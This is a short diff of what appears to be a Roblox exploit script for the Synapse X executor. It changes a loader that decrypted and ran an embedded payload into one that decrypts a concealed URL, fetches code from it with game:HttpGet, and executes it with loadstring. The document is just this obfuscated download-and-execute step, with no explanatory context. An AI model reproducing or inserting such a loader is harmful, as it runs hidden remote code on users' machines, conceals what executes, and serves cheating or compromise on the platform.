@@ -1,5 +1,5 @@
 
-loadstring(syn.crypt.decrypt(
+loadstring(game:HttpGet(((syn.crypt.decrypt(
     getgenv().Encrypted,
-    getgenv().Key))
+    getgenv().Key)), true))())
 
